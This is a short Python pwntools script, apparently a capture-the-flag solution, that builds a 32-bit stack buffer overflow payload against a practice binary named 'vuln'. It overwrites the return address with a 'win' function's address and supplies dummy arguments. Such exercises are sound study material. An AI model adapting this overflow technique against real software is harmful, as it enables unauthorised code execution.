#!/usr/bin/python

from pwn import *
import os

target_addr = os.popen('readelf -s vuln | grep win | grep -oE "[0-9a-f]+{8}"').read().rstrip('\n')

# Offset + return addr for win function + dummy return addr + args
print('a'*112 + p32(int(target_addr, 16)) + "fill" + p32(0xdeadbeef) + p32(0xdeadc0de))

